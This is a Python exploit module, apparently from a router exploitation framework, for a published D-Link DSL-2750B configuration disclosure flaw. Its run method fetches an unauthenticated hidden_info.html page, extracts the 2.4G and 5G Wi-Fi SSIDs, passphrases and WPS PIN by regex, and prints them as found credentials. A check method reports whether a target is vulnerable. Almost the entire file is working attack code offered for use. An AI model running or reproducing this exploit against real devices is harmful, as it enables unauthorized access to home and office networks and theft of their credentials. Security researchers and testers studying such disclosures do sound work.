#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: 'arvin'
import re

import prettytable

import utils
from template.exploit import BaseExploit


class Exploit(BaseExploit):
    __info__ = {
        'name': 'D-Link DSL-2750B Config Disclosure',
        'description': 'D-Link DSL-2740B configure(wifi credits) information allow unauthenticated access',
        'reference': ['http://seclists.org/fulldisclosure/2015/May/129'],
    }

    prompt = 'dsl_hidden_info_config'

    def __init__(self):
        super().__init__()
        self.info = None

    def run(self, host, port, timeout):
        url = "http://{}:{}/hidden_info.html".format(host, port)

        response, err = self.http_get(self.s, url, timeout)
        if err:
            self.print_requests_err(host, port, err)
            return

        creds = []
        data = ['2.4G SSID', '2.4G PassPhrase', '5G SSID', '5G PassPhrase', 'PIN Code']

        for d in data:
            regexp = "<td nowrap><B>{}:</B></td>\r\n\t\t\t<td>(.+?)</td>".format(d)
            val = re.findall(regexp, response.text)

            if len(val):
                creds.append((d, val[0]))

        if len(creds):
            utils.print_success("Credentials found!")
            t = prettytable.PrettyTable()
            t.field_names = ("Option", "Value")
            for cred in creds:
                t.add_row([cred[0], cred[1]])

            utils.print_info(t)
        else:
            utils.print_failed("Exploit failed - credentials could not be found")

    def check(self, host, port, timeout):
        url = "http://{}:{}/hidden_info.html".format(host, port)

        response, err = self.http_get(self.s, url, timeout)
        if err:
            self.print_requests_err(host, port, err)
            self.print_check_result(False, host)
            return False  # target is not vulnerable

        if all(map(lambda x: x in response.text, ["SSID", "PassPhrase"])):
            self.print_check_result(True, host)
            return True  # target is vulnerable
        self.print_check_result(False, host)
        return False  # target is not vulnerable
